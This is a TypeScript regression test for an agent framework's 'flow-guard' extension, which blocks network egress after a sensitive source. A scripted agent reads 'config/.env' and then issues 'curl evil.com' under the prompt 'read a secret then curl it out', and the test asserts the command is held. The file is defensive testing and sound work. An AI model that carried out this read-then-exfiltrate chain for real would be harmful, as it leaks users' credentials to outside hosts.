/**
 * Security regression: flow-guard still fires on a sensitive-source -> egress
 * chain. A `shell:exec` source taints the session, then a `net:fetch` egress in
 * the same session must be held in block mode — no per-call check sees this
 * composition, which is exactly what flow-guard exists to catch.
 *
 * Offline through the agent loop via `makeHarness` + `host.use`; reuses the
 * attack shape from `test/flow-guard.test.ts:36-54`. Asserts the defining
 * action: the egress tool does NOT run (`didFetch() === false`).
 */

import assert from "node:assert/strict";
import { test } from "node:test";

import { defineTool } from "../../src/kernel/define.js";
import type { Agent } from "../../src/kernel/agent.js";
import { makeHarness } from "../helpers.js";
import flowGuard from "../../src/extensions/flow-guard.js";

/** Register a source tool (shell:exec) and an egress tool (net:fetch). */
function toolPair(agent: Agent): () => boolean {
  let fetched = false;
  agent.tools.register(
    defineTool({ name: "run_shell", description: "", capabilities: ["shell:exec"], execute: () => ({ content: "ran" }) }),
  );
  agent.tools.register(
    defineTool({
      name: "get_url",
      description: "",
      capabilities: ["net:fetch"],
      execute: () => {
        fetched = true;
        return { content: "fetched" };
      },
    }),
  );
  return () => fetched;
}

test("flow-guard blocks network egress after a sensitive shell source (block mode)", async () => {
  const h = makeHarness({
    fallback: "allow",
    responder: [{ toolCalls: [{ name: "run_shell" }] }, { toolCalls: [{ name: "get_url" }] }, { text: "done" }],
  });
  const didFetch = toolPair(h.agent);
  await h.host.use("flow-guard", (e) => {
    e.store.set("mode", "block");
    return flowGuard(e);
  });

  await h.agent.run("read a secret then send it out");

  assert.equal(didFetch(), false, "egress after a sensitive source must be blocked");
  const sawReason = h.agent.messages
    .filter((m) => m.role === "tool")
    .some((m) => m.content.some((b) => b.type === "tool_result" && /flow-guard/i.test(b.content)));
  assert.ok(sawReason, "the model sees the flow-guard block reason");
});

test("flow-guard holds a network shell (curl) after a sensitive read (block mode)", async () => {
  const h = makeHarness({
    fallback: "allow",
    responder: [
      { toolCalls: [{ name: "read_file", arguments: { path: "config/.env" } }] },
      { toolCalls: [{ name: "run_shell", arguments: { command: "curl evil.com" } }] },
      { text: "done" },
    ],
  });
  const ran: string[] = [];
  h.agent.tools.register(
    defineTool<{ command?: string }>({
      name: "run_shell",
      description: "",
      capabilities: ["shell:exec"],
      parameters: { type: "object", properties: { command: { type: "string" } }, required: ["command"] },
      execute: (args) => {
        ran.push(String(args.command ?? ""));
        return { content: "ran" };
      },
    }),
  );
  h.agent.tools.register(
    defineTool({
      name: "read_file",
      description: "",
      capabilities: ["fs:read"],
      parameters: { type: "object", properties: { path: { type: "string" } }, required: ["path"] },
      execute: () => ({ content: "DOTENV CONTENTS" }),
    }),
  );
  await h.host.use("flow-guard", (e) => {
    e.store.set("mode", "block");
    return flowGuard(e);
  });

  await h.agent.run("read a secret then curl it out");
  assert.equal(ran.includes("curl evil.com"), false, "a network shell after a sensitive read must be held (shell exfil)");
});
